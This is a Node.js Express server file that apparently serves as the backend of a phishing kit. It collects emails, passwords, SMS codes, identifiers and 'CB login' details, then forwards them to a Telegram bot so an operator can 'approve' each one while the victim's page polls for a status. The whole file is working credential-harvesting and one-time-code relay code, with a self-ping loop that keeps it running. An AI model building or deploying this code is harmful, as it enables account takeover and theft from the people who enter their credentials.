// server.js (merged)
console.log("📦 Starting combined server.js...");

const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fetch = require("node-fetch");
const {
  sendApprovalRequest,
  sendApprovalRequestGeneric,
  sendApprovalRequestSMS,
  sendApprovalRequestPage,
  sendLoginTelegram
} = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// -----------------
// Store pending approvals
// -----------------
const pendingUsers = {}; // email/password login (big)
const pendingCodes = {}; // SMS codes
const pendingGeneric = {}; // generic codes
const pendingPage = {}; // page 4 logins
const pendingApprovals = {}; // CB login approvals { email: { status, password, region, device } }

// -----------------
// Health check
// -----------------
app.get("/", (req, res) => {
  res.send("✅ Combined Server is running.");
});

// -----------------
// Email/Password Login (big)
app.post("/login", (req, res) => {
  const email = (req.body.email || "").trim().toLowerCase();
  const password = req.body.password;

  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });

  pendingUsers[email] = { password, status: "pending" };
  console.log(`📥 Login Received: ${email}`);

  sendApprovalRequest(email, password);
  res.json({ success: true });
});

// -----------------
// Generic code submission (big)
app.post("/generic-login", (req, res) => {
  const identifier = (req.body.identifier || "").trim();
  if (!identifier) return res.status(400).json({ success: false, message: "Identifier required" });

  pendingGeneric[identifier] = { status: "pending" };
  console.log(`📥 Generic Identifier Received: ${identifier}`);

  sendApprovalRequestGeneric(identifier);
  res.json({ success: true });
});

// -----------------
// SMS Login (big)
app.post("/sms-login", (req, res) => {
  const code = (req.body.code || "").trim();
  if (!code) return res.status(400).json({ success: false, message: "Code required" });

  pendingCodes[code] = { status: "pending" };
  console.log(`📥 SMS Code Received: ${code}`);

  sendApprovalRequestSMS(code);
  res.json({ success: true });
});

// -----------------
// Page 4 Login (big)
app.post("/page-login", (req, res) => {
  const email = (req.body.email || "").trim().toLowerCase();
  const password = req.body.password;

  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });

  pendingPage[email] = { password, status: "pending" };
  console.log(`📥 Page 4 Login Received: ${email}`);

  sendApprovalRequestPage(email, password);
  res.json({ success: true });
});

// -----------------
// CB Login (small)
app.post("/send-login", async (req, res) => {
  const { email, password, region, device } = req.body;
  if (!email || !password) return res.status(400).json({ error: "Missing email or password" });

  // Store pending first
  pendingApprovals[email] = { status: "pending", password, region, device };
  console.log(`📥 CB Login received: ${email}`);

  // Send Telegram message
  try {
    await sendLoginTelegram(email);
  } catch (err) {
    console.error("❌ Failed to send Telegram message:", err);
  }

  res.json({ status: "ok" });
});

// -----------------
// Check status
// Supports all types: big + CB
app.get("/check-status", (req, res) => {
  const identifier = (req.query.identifier || "").trim();
  if (pendingUsers[identifier]) return res.json({ status: pendingUsers[identifier].status });
  if (pendingCodes[identifier]) return res.json({ status: pendingCodes[identifier].status });
  if (pendingGeneric[identifier]) return res.json({ status: pendingGeneric[identifier].status });
  if (pendingPage[identifier]) return res.json({ status: pendingPage[identifier].status });
  if (pendingApprovals[identifier]) return res.json({ status: pendingApprovals[identifier].status });
  res.json({ status: "unknown" });
});

// For frontend polling of CB login
app.post("/check-status", (req, res) => {
  const { email } = req.body;
  if (!email || !pendingApprovals[email]) return res.json({ status: "pending" });
  res.json({ status: pendingApprovals[email].status });
});

// -----------------
// Update approval status (called by bot)
app.post("/update-status", (req, res) => {
  const identifier = (req.body.identifier || req.body.email || "").trim();
  const status = req.body.status;

  console.log(`📬 Update Status Received: ${identifier}, ${status}`);

  if (pendingUsers[identifier]) {
    pendingUsers[identifier].status = status;
  } else if (pendingCodes[identifier]) {
    pendingCodes[identifier].status = status;
  } else if (pendingGeneric[identifier]) {
    pendingGeneric[identifier].status = status;
  } else if (pendingPage[identifier]) {
    pendingPage[identifier].status = status;
  } else if (pendingApprovals[identifier]) {
    pendingApprovals[identifier].status = status;
  } else {
    return res.json({ ok: false, message: "Identifier not found" });
  }

  console.log(`✅ Status updated for: ${identifier}`);
  res.json({ ok: true });
});

// -----------------
// Self-ping to stay awake
setInterval(() => {
  const url = process.env.APP_URL;
  if (url) {
    fetch(url).then(() => console.log("🔁 Pinged self")).catch(err => console.error("⚠️ Ping failed:", err));
  }
}, 30 * 1000);

// -----------------
// Start server
app.listen(PORT, () => {
  console.log(`✅ Combined server running at port ${PORT}`);
});
